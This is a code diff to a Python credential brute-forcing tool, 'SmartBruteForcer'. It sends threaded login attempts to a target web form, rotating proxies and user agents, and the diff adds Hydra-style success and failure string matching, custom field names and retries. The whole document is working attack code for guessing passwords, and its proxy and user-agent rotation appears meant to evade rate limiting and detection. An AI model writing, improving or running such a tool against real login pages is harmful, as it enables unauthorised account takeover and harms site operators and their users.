@@ -117,6 +117,11 @@ class SmartBruteForcer:
         self.result = None
         self.verbose = config.get('verbose', False)
         self.base_url = config['target_url']
+        self.user_field = config.get('username_field', 'username')
+        self.pass_field = config.get('password_field', 'password')
+        self.success_str = config.get('success_string')
+        self.failure_str = config.get('failure_string')
+        self.max_retries = config.get('max_retries', 3)
         
         if config.get('headers'):
             self.session.headers.update(config['headers'])
@@ -139,89 +144,75 @@ class SmartBruteForcer:
         return random.choice(user_agents)
     
     def make_request(self, username: str, password: str) -> Tuple[bool, Dict]:
-        """Make a single authentication attempt"""
-        proxy = self.proxy_manager.get_proxy() if self.proxy_manager else None
-        user_agent = self.rotate_user_agent()
-        
-        data = self.config['payload_template'].copy()
-        data[self.config['username_field']] = username
-        data[self.config['password_field']] = password
-        
-        headers = self.session.headers.copy()
-        headers['User-Agent'] = user_agent
-        
-        try:
-            delay = self.get_random_delay()
-            time.sleep(delay)
+        """Make a single authentication attempt with retries"""
+        for retry in range(self.max_retries):
+            proxy = self.proxy_manager.get_proxy() if self.proxy_manager else None
+            user_agent = self.rotate_user_agent()
             
-            response = self.session.post(
-                self.config['target_url'],
-                data=data,
-                headers=headers,
-                proxies=proxy,
-                timeout=self.config.get('timeout', 30),
-                allow_redirects=self.config.get('allow_redirects', True)
-            )
+            data = self.config.get('payload_template', {}).copy()
+            data[self.user_field] = username
+            data[self.pass_field] = password
             
-            with self.lock:
-                self.attempts += 1
+            headers = self.session.headers.copy()
+            headers['User-Agent'] = user_agent
+            
+            try:
+                response = self.session.post(
+                    self.base_url,
+                    data=data,
+                    headers=headers,
+                    proxies=proxy,
+                    timeout=self.config.get('timeout', 15),
+                    allow_redirects=True
+                )
                 
-            success_indicators = self.config.get('success_indicators', [])
-            failure_indicators = [f.lower() for f in self.config.get('failure_indicators', [])]
-            
-            is_success = False
-            
-            # 1. Check if we were redirected (History check)
-            # Most successful logins redirect (302) to a dashboard/profile
-            if response.history:
-                for hist_resp in response.history:
-                    if hist_resp.status_code in [301, 302, 303, 307, 308]:
-                        # Check where it redirected to
-                        final_location = response.url.lower()
-                        if 'login' not in final_location or 'dashboard' in final_location or 'account' in final_location:
+                with self.lock:
+                    self.attempts += 1
+                
+                is_success = False
+                
+                # Success/Failure detection logic
+                # 1. User defined Success String (Hydra S= behavior)
+                if self.success_str:
+                    if str(self.success_str).lower() in response.text.lower():
+                        is_success = True
+                
+                # 2. User defined Failure String (Hydra F= behavior)
+                elif self.failure_str:
+                    if str(self.failure_str).lower() not in response.text.lower():
+                        is_success = True
+                
+                # 3. Default Heuristics (Redirect/URL change)
+                else:
+                    # Check redirection history
+                    if response.history:
+                        for hist_resp in response.history:
+                            if hist_resp.status_code in [301, 302, 303, 307, 308]:
+                                final_location = response.url.lower()
+                                if 'login' not in final_location or 'dashboard' in final_location or 'user' in final_location:
+                                    is_success = True
+                                    break
+                    
+                    if not is_success and response.url.rstrip('/') != self.base_url.rstrip('/'):
+                        if 'login' not in response.url.lower() or 'dashboard' in response.url.lower():
                             is_success = True
-                            break
 
-            # 2. Check final URL vs Initial URL
-            if not is_success:
-                if response.url.rstrip('/') != self.base_url.rstrip('/'):
-                    # If the URL changed and it doesn't look like a login page reload, it's likely success
-                    if 'login' not in response.url.lower() or 'dashboard' in response.url.lower():
-                        is_success = True
+                if self.verbose:
+                    status = "[CORRECT]" if is_success else "[INCORRECT]"
+                    print(f"{self.base_url} - {username} - {password} - {status}")
 
-            # 3. Check for success text indicators
-            if not is_success:
-                for indicator in success_indicators:
-                    if indicator.lower() in response.text.lower():
-                        is_success = True
-                        break
-            
-            # 4. Filter out False Positives using failure indicators
-            if is_success:
-                for indicator in failure_indicators:
-                    if indicator in response.text.lower():
-                        is_success = False
-                        break
+                if is_success:
+                    return True, {'username': username, 'password': password}
 
-            if self.verbose:
-                status = "[CORRECT]" if is_success else "[INCORRECT]"
-                # Format: url - username - password - [incorrect/correct]
-                print(f"{self.base_url} - {username} - {password} - {status}")
-
-            if is_success:
-                logger.info(f"SUCCESS! Credentials found -> {username}:{password}")
-                return True, {
-                    'username': username,
-                    'password': password,
-                    'response_url': response.url,
-                    'status_code': response.status_code
-                }
-
-            return False, {}
-            
-        except requests.exceptions.RequestException as e:
-            logger.debug(f"Request error for {username}:{password}: {e}")
-            return False, {}
+                return False, {}
+                
+            except Exception as e:
+                if retry == self.max_retries - 1:
+                    logger.debug(f"Final retry failed for {username}:{password}: {e}")
+                else:
+                    time.sleep(1) # Short sleep before retry
+                    
+        return False, {}
     
     def test_connection(self) -> bool:
         """Test reachability and establish initial session cookies"""
@@ -344,7 +335,12 @@ def main():
     parser.add_argument('-r', '--rotate-interval', type=int, default=0, help='IP rotation (secs)')
     parser.add_argument('-c', '--config', default='bruteforce_config.json', help='Config file')
     parser.add_argument('-t', '--threads', type=int, default=3, help='Threads')
-    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output (show every attempt)')
+    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
+    parser.add_argument('--user-field', default='username', help='Username field name')
+    parser.add_argument('--pass-field', default='password', help='Password field name')
+    parser.add_argument('-S', '--success-string', help='String indicating success')
+    parser.add_argument('-F', '--failure-string', help='String indicating failure')
+    parser.add_argument('--retries', type=int, default=3, help='Max retries per attempt')
     
     args = parser.parse_args()
     
@@ -370,7 +366,12 @@ def main():
         passwords = load_list(args.wordlist, "passwords")
         rotate_interval = args.rotate_interval
         threads = args.threads
-        config['verbose'] = args.verbose
+        config['verbose'] = bool(args.verbose)
+        config['username_field'] = str(args.user_field)
+        config['password_field'] = str(args.pass_field)
+        config['success_string'] = args.success_string
+        config['failure_string'] = args.failure_string
+        config['max_retries'] = int(args.retries)
 
     if not usernames or not passwords or not config.get('target_url'):
         logger.error("Missing required parameters (URL, Users, Passwords).")
